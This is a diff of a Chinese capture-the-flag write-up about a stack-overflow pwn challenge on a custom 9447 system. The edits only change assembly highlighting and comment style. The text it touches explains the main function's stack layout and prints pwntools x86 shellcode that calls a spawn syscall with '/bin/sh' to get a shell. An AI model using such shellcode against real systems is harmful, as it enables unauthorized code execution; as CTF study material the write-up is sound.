@@ -21,8 +21,8 @@ share: true
 这题和 calcpop 有一点不同的是，calcpop 中输入 exit 会直接退出 main 函数，这题输入 exit 会调用`shutdown()`之类的函数，没细看，效果就是不会再有输出了。这道题退出 main 函数的方法是，正确输入，让计算结果为 201527, 程序会输出彩蛋信息，然后退出 main 函数。
 
 接下来就是怎么溢出了，先看 main 函数入口和出口处的栈变化：
-{% highlight asm %}
-# entry:
+{% highlight nasm %}
+; entry:
 lea     ecx, [esp-4]
 and     esp, 0FFFFFFF0h
 push    dword ptr [ecx-4]
@@ -33,7 +33,7 @@ push    esi
 push    ebx
 push    ecx
 
-# exit:
+; exit:
 lea     esp, [ebp-10h]
 xor     eax, eax
 pop     ecx
@@ -51,8 +51,8 @@ retn
 这题怎么写 shellcode 也是一个难点，因为系统是 9447 写的，不能直接用 execv 系统调用。所幸的是本题的系统调用功能都是能从一些字符串上看出来的。比如`read(%d %x %d)`, `write(%d %x %d)`之类。strings 一下可以看到`spawn(%x %x %d)`，我就猜测这个是类似 execv 的系统调用。可是参数不明确，特别是第三个参数。试了几次，发现用`spawn("/bin/sh", "/bin/sh", 1)`这样的参数是可以成功的，第三个参数 1 具体是什么含义，我也没搞明白。
 
 用 pwntool 生成的 shellcode 如下:
-{% highlight asm %}
-# push '/bin/sh\x00'
+{% highlight nasm %}
+; push '/bin/sh\x00'
 push 0x1010101
 xor dword ptr [esp], 0x169722e
 push 0x6e69622f
@@ -61,10 +61,10 @@ mov edi, esp
 push 0x1
 push edi
 push edi
-push 0xdeadbeef  # junk
+push 0xdeadbeef  ; junk
 mov ebx, 302125832
 xor ebx, 0x12121212
-call ebx  # spawn(%x, %x, %d)
+call ebx  ; spawn(%x, %x, %d)
 {% endhighlight %}
 
 ### exp.py
